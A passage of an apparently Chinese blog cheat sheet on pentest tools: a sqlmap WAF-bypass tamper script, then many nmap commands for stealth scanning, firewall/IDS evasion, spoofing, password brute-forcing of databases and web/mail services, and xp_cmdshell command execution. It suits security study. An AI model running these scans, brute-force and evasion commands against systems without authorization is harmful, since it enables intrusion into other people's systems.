用于在控制台中打印出警告信息</span></span><br></pre></td></tr></table></figure><ul><li>kwargs</li></ul><p>在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/vanrish.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span></span><span class="symbol">:</span></span><br><span class="line">    headers = kwargs.get(<span class="string">"headers"</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">"X-originating-IP"</span>] = <span class="string">"127.0.0.1"</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>这个脚本是为了更改 X-originating-IP，以绕过WAF，另一个 kwargs 的使用出现于 xforwardedfor.py，也是为了改 header 以绕过 waf</p><ul><li>部分常数值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/lib/enums.py</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>:</span></span><br><span class="line">    LOWEST = <span class="number">-100</span></span><br><span class="line">    LOWER = <span class="number">-50</span></span><br><span class="line">    LOW = <span class="number">-10</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    HIGH = <span class="number">10</span></span><br><span class="line">    HIGHER = <span class="number">50</span></span><br><span class="line">    HIGHEST = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBMS</span>:</span></span><br><span class="line">    ACCESS = <span class="string">"Microsoft Access"</span></span><br><span class="line">    DB2 = <span class="string">"IBM DB2"</span></span><br><span class="line">    FIREBIRD = <span class="string">"Firebird"</span></span><br><span class="line">    MAXDB = <span class="string">"SAP MaxDB"</span></span><br><span class="line">    MSSQL = <span class="string">"Microsoft SQL Server"</span></span><br><span class="line">    MYSQL = <span class="string">"MySQL"</span></span><br><span class="line">    ORACLE = <span class="string">"Oracle"</span></span><br><span class="line">    PGSQL = <span class="string">"PostgreSQL"</span></span><br><span class="line">    SQLITE = <span class="string">"SQLite"</span></span><br><span class="line">    SYBASE = <span class="string">"Sybase"</span></span><br><span class="line">    HSQLDB = <span class="string">"HSQLDB"</span></span><br></pre></td></tr></table></figure><h3 id="nosqlmap"><a href="#nosqlmap" class="headerlink" title="nosqlmap"></a>nosqlmap</h3><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h4 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1. 全面扫描/综合扫描</span><br><span class="line">nmap -A 192.168.1.103</span><br><span class="line"></span><br><span class="line">2. Ping扫描</span><br><span class="line">nmap -sP 192.168.1.1/24</span><br><span class="line"></span><br><span class="line">3. 免Ping扫描，穿透防火墙，避免被防火墙发现</span><br><span class="line">nmap -P0 192.168.1.103</span><br><span class="line"></span><br><span class="line">4. TCP SYN Ping 扫描</span><br><span class="line">nmap -PS -v 192.168.1.103</span><br><span class="line">nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）</span><br><span class="line"></span><br><span class="line">5. TCP ACK Ping 扫描</span><br><span class="line">nmap -PA -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">6. UDP Ping 扫描</span><br><span class="line">nmap -PU -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">7. ICMP Ping Types 扫描</span><br><span class="line">nmap -PU -v 192.168.1.103    (ICMP ECHO)</span><br><span class="line">nmap -PP -v 192.168.1.103    (ICMP 时间戳)</span><br><span class="line">nmap -PM -v 192.168.1.103    (ICMP 地址掩码)</span><br><span class="line"></span><br><span class="line">8. ARP Ping 扫描</span><br><span class="line">nmap -PR -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">9. 列表 扫描</span><br><span class="line">nmap -sL -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">10. 禁止方向域名解析</span><br><span class="line">nmap -n -sL -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">11. 方向域名解析</span><br><span class="line">nmap -R -sL -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">12. 使用系统域名解析系统</span><br><span class="line">nmap --system-dns 192.168.1.2 192.168.1.103</span><br><span class="line"></span><br><span class="line">13. 扫描IPV6地址</span><br><span class="line">nmap -6 IPv6</span><br><span class="line"></span><br><span class="line">14. 路由跟踪</span><br><span class="line">nmap --traceroute -v www.sunbridgegroup.com</span><br><span class="line"></span><br><span class="line">15. SCTP INIT Ping 扫描</span><br><span class="line">nmap -PY -v 192.168.1.103</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041424344454647</span><br></pre></td></tr></table></figure><h4 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1. 时序扫描</span><br><span class="line">nmap -T(0-5) 192.168.1.103</span><br><span class="line"></span><br><span class="line">2. 常用扫描方式</span><br><span class="line">nmap -p 80 192.168.1.103</span><br><span class="line">nmap -p 80-100 192.168.1.103</span><br><span class="line">nmap -p T:80,U:445 192.168.1.103</span><br><span class="line">nmap -F 192.168.1.1.103    (快速扫描)</span><br><span class="line">nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)</span><br><span class="line"></span><br><span class="line">3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]</span><br><span class="line">nmap -sS -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">4. TCP 连接扫描[全连接扫描]</span><br><span class="line">nmap -sT -v 192.168.1.103</span><br><span class="line"></span><br><span class="line">5. UDP 连接扫描</span><br><span class="line">nmap -sU -p 80-100 192.168.1.103</span><br><span class="line"></span><br><span class="line">6. 隐蔽扫描</span><br><span class="line">nmap -sN 61.241.194.153(NULL扫描)</span><br><span class="line">nmap -sF 61.241.194.153(FIN扫描)</span><br><span class="line">nmap -sX 61.241.194.153(Xmas扫描)</span><br><span class="line"></span><br><span class="line">7. TCP ACK 扫描</span><br><span class="line">nmap -sA 192.168.1.103</span><br><span class="line"></span><br><span class="line">8. TCP 窗口扫描</span><br><span class="line">nmap -sW -v -F  192.168.1.103</span><br><span class="line"></span><br><span class="line">9. TCP Maimon 扫描</span><br><span class="line">nmap -sM -T4  192.168.1.103</span><br><span class="line"></span><br><span class="line">10. 自定义 扫描</span><br><span class="line">nmap -sT --scanflags SYNURG 192.168.1.103</span><br><span class="line"></span><br><span class="line">11. 空闲 扫描( 隐藏IP )</span><br><span class="line">nmap -sI www.0day.co:80 192.168.1.103</span><br><span class="line"></span><br><span class="line">12. IP协议 扫描</span><br><span class="line">nmap -sO -T4 192.168.1.103</span><br><span class="line"></span><br><span class="line">13. FTP Bounce 扫描</span><br><span class="line">(已经不被支持)</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041424344</span><br></pre></td></tr></table></figure><h4 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a>三、指纹识别与探测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. 版本探测（显示banner信息）</span><br><span class="line">nmap -sV 192.168.1.103</span><br><span class="line">nmap -sV -A 192.168.1.103</span><br><span class="line"></span><br><span class="line">2. 全端口版本探测</span><br><span class="line">nmap -sV --allports 192.168.1.103</span><br><span class="line"></span><br><span class="line">3. 设置扫描强度</span><br><span class="line">nmap -sV --version-intensity (0-9) 192.168.1.103</span><br><span class="line"></span><br><span class="line">4. 轻量级扫描</span><br><span class="line">nmap -sV --version-light 2 192.168.1.103</span><br><span class="line"></span><br><span class="line">5. 重量级扫描</span><br><span class="line">nmap -sV --version-all 192.168.1.103</span><br><span class="line"></span><br><span class="line">6. 获取详细版本信息</span><br><span class="line">nmap -sV --version-trace 192.168.1.103</span><br><span class="line"></span><br><span class="line">7. RPC扫描</span><br><span class="line">nmap -sS -sR 192.168.1.103</span><br><span class="line"></span><br><span class="line">8. 对指定的目标进行操作系统监测</span><br><span class="line">nmap -O --osscan-limit 192.168.1.103</span><br><span class="line"></span><br><span class="line">9. 推测系统并识别</span><br><span class="line">nmap -O --osscan-guess 192.168.1.103</span><br><span class="line">123456789101112131415161718192021222324252627</span><br></pre></td></tr></table></figure><h4 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a>四、伺机而动</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 调整并行扫描组的大小</span><br><span class="line">nmap --min-hostgroup 30 192.168.1.110/24</span><br><span class="line">nmap --max-hostgroup 30 902 192.168.1.104</span><br><span class="line"></span><br><span class="line">2. 调整探测报文的并行度</span><br><span class="line">nmap --min-parallelism 100 192.168.1.104</span><br><span class="line">nmap --max-parallelism 100 192.168.1.104</span><br><span class="line"></span><br><span class="line">3. 调整探测报文超时</span><br><span class="line">nmap --initial-rtt-timeout 100ms 192.168.1.104</span><br><span class="line">nmap --max-rtt-timeout 100ms 192.168.1.104</span><br><span class="line">nmap --min-rtt-timeout 100ms 192.168.1.104</span><br><span class="line"></span><br><span class="line">4. 放弃缓慢的目标主机</span><br><span class="line">nmap --host-timeout 1800000ms 192.168.1.104</span><br><span class="line"></span><br><span class="line">5. 调整报文适合时间间隔</span><br><span class="line">nmap --scan-delay 1s 192.168.1.104</span><br><span class="line">nmap --max-scan-delay 1s 192.168.1.104</span><br><span class="line">12345678910111213141516171819</span><br></pre></td></tr></table></figure><h4 id="五、防火墙-IDS逃逸"><a href="#五、防火墙-IDS逃逸" class="headerlink" title="五、防火墙/IDS逃逸"></a>五、防火墙/IDS逃逸</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1. 报文分段</span><br><span class="line">nmap -f -v 61.241.194.153</span><br><span class="line"></span><br><span class="line">2. 指定偏移大小</span><br><span class="line">nmap --mtu 16 192.168.1.104</span><br><span class="line"></span><br><span class="line">3. IP欺骗</span><br><span class="line">nmap -D RND:11 192.168.1.104</span><br><span class="line">nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.104</span><br><span class="line"></span><br><span class="line">4. 源地址欺骗</span><br><span class="line">nmap -sI www.0day.cn:80 192.168.1.104</span><br><span class="line"></span><br><span class="line">5. 源端口欺骗</span><br><span class="line">nmap --source-port 902 192.168.1.104</span><br><span class="line"></span><br><span class="line">6. 指定发包长度</span><br><span class="line">nmap --data-length 30 192.168.1.104</span><br><span class="line"></span><br><span class="line">7. 目标主机随机排序</span><br><span class="line">nmap --randomize-hosts 192.168.1.104</span><br><span class="line"></span><br><span class="line">8. MAX地址欺骗</span><br><span class="line">nmap -sT -Pn --spoof-mac 0 192.168.1.104</span><br><span class="line">123456789101112131415161718192021222324</span><br></pre></td></tr></table></figure><h4 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1. IP信息收集</span><br><span class="line">nmap --script ip-geolocation-* www.pcos.cn</span><br><span class="line"></span><br><span class="line">2. WHOIS 查询</span><br><span class="line">nmap --script whois-domain www.pcos.cn</span><br><span class="line">nmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.com</span><br><span class="line">nmap -sn --script whois-domain -v -iL host.txt</span><br><span class="line"></span><br><span class="line">3. 搜索邮件信息(新版可能没有这个模块)</span><br><span class="line">nmap --script http-email-harvest www.pcos.cn</span><br><span class="line"></span><br><span class="line">4. IP反查</span><br><span class="line">nmap -sn --script hostmap-ip2hosts www.pcos.cn</span><br><span class="line"></span><br><span class="line">5. DNS信息收集</span><br><span class="line">nmap --script dns-brute www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10 www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn</span><br><span class="line"></span><br><span class="line">6. 检索系统信息</span><br><span class="line">nmap -p 445 445 192.168.1.104 --script membase-http-info</span><br><span class="line"></span><br><span class="line">7. 后台打印机服务漏洞</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line">8. 系统漏洞扫描</span><br><span class="line">nmap --script smb-check-vulns.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line">9.扫描Web漏洞</span><br><span class="line">nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.45</span><br><span class="line"></span><br><span class="line">10. 通过 Snmp 列举 Windows 服务/账户</span><br><span class="line">nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104</span><br><span class="line">nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.110</span><br><span class="line"></span><br><span class="line">11. 枚举 DNS 服务器的主机名</span><br><span class="line">nmap --script dns-brute --script-args dns-brute.domain=baidu.com</span><br><span class="line"></span><br><span class="line">12. HTTP信息收集</span><br><span class="line">nmap -sV -p 80 www.0day.com (HTTP版本探测)</span><br><span class="line">nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)</span><br><span class="line">nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)</span><br><span class="line"></span><br><span class="line">13. 枚举SSL密钥</span><br><span class="line">nmap -p 443 --script=ssl-enum-ciphers www.baidu.com</span><br><span class="line"></span><br><span class="line">14. SSH服务密钥信息探测</span><br><span class="line">map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748</span><br></pre></td></tr></table></figure><h4 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a>七、数据库渗透测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1. Mysql列举数据库</span><br><span class="line">nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.101</span><br><span class="line"></span><br><span class="line">2. 列举 MySQL 变量</span><br><span class="line">nmap -p3306 --script=mysql-variables 192.168.1.3</span><br><span class="line">nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)</span><br><span class="line"></span><br><span class="line">3. 检查 MySQL 密码</span><br><span class="line">nmap -p3306 --script=mysql-empty-password 192.168.1.3</span><br><span class="line">nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.3</span><br><span class="line"></span><br><span class="line">4. 审计 MySQL 密码</span><br><span class="line">nmap --script=mysql-brute 192.168.1.101</span><br><span class="line">nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)</span><br><span class="line"></span><br><span class="line">5. 审计 MySQL 安全配置</span><br><span class="line">nmap -p3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='123',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.1.104</span><br><span class="line"></span><br><span class="line">6. 审计 Oracle 密码</span><br><span class="line">nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121</span><br><span class="line">nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.105</span><br><span class="line"></span><br><span class="line">7. 审计 msSQL密码</span><br><span class="line">nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.104</span><br><span class="line"></span><br><span class="line">8. 检查 msSQL空密码</span><br><span class="line">nmap -p 1433 --script ms-sql-empty-password 192.168.1.104</span><br><span class="line"></span><br><span class="line">9. 读取 msSQL 数据</span><br><span class="line">nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.101</span><br><span class="line"></span><br><span class="line">10. 读取 msSQL 执行系统命令</span><br><span class="line">nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="ipconfig" 192.168.1.101</span><br><span class="line"></span><br><span class="line">11. 审计 PgSQL 密码</span><br><span class="line">nmap -p 5432 --script pgsql-brute 192.168.1.101</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536</span><br></pre></td></tr></table></figure><h4 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a>八、渗透测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1. 审计 HTTP 身份验证</span><br><span class="line">nmap --script=http-brute -p 80 www.pcos.cn</span><br><span class="line"></span><br><span class="line">2. 审计 FTP 服务器</span><br><span class="line">nmap --script ftp-brute -p 21 192.168.1.101</span><br><span class="line">nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101</span><br><span class="line">nmap --script=ftp-anon 192.168.1.101</span><br><span class="line"></span><br><span class="line">3. 审计 Wordpress 程序</span><br><span class="line">nmap -p80 --script http-wordpress-brute 192.168.1.110</span><br><span class="line">nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110</span><br><span class="line">nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.110</span><br><span class="line"></span><br><span class="line">4. 审计 Joomla 程序</span><br><span class="line">nmap -p80 --script http-joomla-brute 192.168.1.110</span><br><span class="line">nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110</span><br><span class="line">nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.110</span><br><span class="line"></span><br><span class="line">5. 审计 邮件服务器 </span><br><span class="line">nmap -p110 --script=pop3-brute 192.168.1.110</span><br><span class="line"></span><br><span class="line">6. 审计 SMB 口令</span><br><span class="line">nmap --script smb-brute.nse -p 445 192.168.1.110</span><br><span class="line">nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.110</span><br><span class="line"></span><br><span class="line">7. 审计 VNC 服务</span><br><span class="line">nmap --script vnc-brute -p 5900 192.168.1.110</span><br><span class="line"></span><br><span class="line">8. 审计 SMTP 服务器</span><br><span class="line">nmap -p 25 --script smtp-brute 192.168.1.110</span><br><span class="line">nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)</span><br><span class="line"></span><br><span class="line">9. 检测 Stuxnet 蠕虫</span><br><span class="line">nmap --script stuxnet-detect -p 445 192.168.1.110</span><br><span class="line"></span><br><span class="line">10. SNMP 服务安全审计</span><br><span class="line">nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)</span><br><span class="line">nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)</span><br><span class="line">nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)</span><br><span class="line">nmap -sU -p 161 --script snmp-brute 192.168.1.110</span><br><span class="line">12345678910111213141516171819202122232425262728293031323334353637383940</span><br></pre></td></tr></table></figure><h4 id="九、Zenmap"><a href="#九、Zenmap" class="headerlink" title="九、Zenmap"></a>九、Zenmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. Intense scan (详细扫描)</span><br><span class="line">nmap -T4 -A -v 192.168.1.101</span><br><span class="line"></span><br><span class="line">2. Intense scan plus UDP (UDP扫描经典使用)</span><br><span class="line">nmap -sS -sU -T4 -A -v 192.168.1.101</span><br><span class="line"></span><br><span class="line">3. Intense scan, all TCP ports (TCP扫描)</span><br><span class="line">nmap -p 1-65535 -T4 -A -v 192.168.1.101</span><br><span class="line"></span><br><span class="line">4. Intense scan, no ping (无Ping扫描)</span><br><span class="line">nmap -T4 -A -v -Pn 192.168.1.101</span><br><span class="line"></span><br><span class="line">5. Ping scan (Ping扫描)</span><br><span class="line">nmap -sn 192.168.1.101/24</span><br><span class="line"></span><br><span class="line">6. Quick scan</span><br><span class="line">nmap -T4 -F 192.168.1.101/24</span><br><span class="line"></span><br><span class="line">7. Quick scan plus</span><br><span class="line">nmap -sV -T4 -O -F --version-light 192.168.1.101/24</span><br><span class="line"></span><br><span class="line">8. Quick traceroute</span><br><span class="line">nmap -sn --traceroute 192.168.1.101</span><br><span class="line"></span><br><span class="line">9. Regular scan </span><br><span class="line">nmap 192.168.1.101</span><br><span class="line"></span><br><span class="line">10. Slow comprehensive scan</span><br><span class="line">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 192.168.1.101</span><br><span class="line">1234567891011121314151617181920212223242526272829</span><br></pre></td></tr></table></figure><h4 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a>十. Nmap 技巧</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 